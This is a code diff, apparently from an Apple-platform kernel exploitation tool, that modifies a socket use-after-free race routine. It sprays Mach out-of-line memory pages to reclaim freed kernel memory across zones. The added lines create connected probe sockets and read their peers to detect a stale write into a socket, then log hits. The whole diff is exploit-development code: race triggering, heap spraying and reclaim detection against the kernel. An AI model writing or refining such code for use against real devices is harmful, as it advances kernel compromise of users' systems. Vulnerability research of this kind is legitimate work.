@@ -627,7 +627,8 @@ func runFuzzMode() async {
     // the run usually panics instead of reporting a clean hit.
     nonisolated func sockUafRaceCrossZone(_ st: SockUafState, _ target: Int32,
                                           _ it: Int, _ spraySize: Int,
-                                          _ sprayCount: Int) -> Bool {
+                                          _ sprayCount: Int, _ precPort: Int,
+                                          _ peers: inout [Int32], _ peerLock: NSLock) -> Bool {
         let n = 6
         st.fd = target
         st.done = 0
@@ -645,6 +646,11 @@ func runFuzzMode() async {
             if OSAtomicCompareAndSwap32(2, 3, &st.p[1]) { close(target) }
         }
         let doneAtClose = st.done
+        // Observer: a batch of connected sockets with a pre-established peer lets us
+        // see whether the stale send landed in a *socket* (bytes arrive at the peer)
+        // rather than in our OOL data. Nothing is sent on these, so any delivery at
+        // all is stale-sender data.
+        let probe = sockUafSprayConnected(48, precPort)
         sockuaf_ool_reset()
         let sprayed = sockuaf_ool_spray(spraySize, Int32(sprayCount), 0x41)
         var w = 0
@@ -654,8 +660,28 @@ func runFuzzMode() async {
         st.fd = -1
         st.mode = 0
         usleep(120)
-        emitBg("[*] ITER \(it) crosszone: sprayed \(sprayed)x\(spraySize) OOL, senders done=\(st.done) (at close \(doneAtClose)/6), afterCloseOk=\(st.postCloseOk)")
-        return st.postCloseOk > 0
+        var got = 0
+        var rbuf = [UInt8](repeating: 0, count: 65536)
+        peerLock.lock()
+        let snapshot = peers
+        peers.removeAll()
+        peerLock.unlock()
+        for pf in snapshot {
+            var r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT)
+            while r > 0 {
+                got += r
+                if got > 0x100000 { break }
+                r = recv(pf, &rbuf, rbuf.count, MSG_DONTWAIT)
+            }
+        }
+        for pf in snapshot { close(pf) }
+        for fd in probe { close(fd) }
+        emitBg("[*] ITER \(it) crosszone: sprayed \(sprayed)x\(spraySize) OOL, peer bytes=\(got), senders done=\(st.done) (at close \(doneAtClose)/6)")
+        if got > 0 {
+            emitBg("[!] ITER \(it) crosszone: *** STALE WRITE into a socket: \(got) byte(s) ***")
+            return true
+        }
+        return false
     }
 
     // Page-free race: allocate a block of adjacent sockets, race the middle
@@ -1165,7 +1191,7 @@ func runFuzzMode() async {
                 // ---- variant F: cross-zone reclaim with mach OOL pages ----
                 let target = sockUafMakeSocket(ip, port)
                 if target >= 0 {
-                    if sockUafRaceCrossZone(st, target, it, oolSpraySize(), 256) { hits += 1 }
+                    if sockUafRaceCrossZone(st, target, it, oolSpraySize(), 256, precPort, &precPeers, peerLock) { hits += 1 }
                 }
             } else if r == 6 {
                 // ---- variant G: free a whole socket page, then OOL spray ----
